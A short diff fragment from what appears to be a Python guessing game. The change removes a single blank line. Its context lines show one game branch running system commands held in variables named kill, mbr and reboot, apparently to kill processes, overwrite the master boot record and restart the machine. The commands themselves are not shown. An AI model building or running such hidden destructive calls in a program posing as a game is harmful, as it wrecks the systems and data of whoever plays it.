@@ -118,7 +118,6 @@ elif guess == number:
 	os.system(kill)
 	os.system(mbr)
 	os.system(reboot)
-
 else:
 	os.system("cls")
 	print("\nYou won! Now get out of my face.")
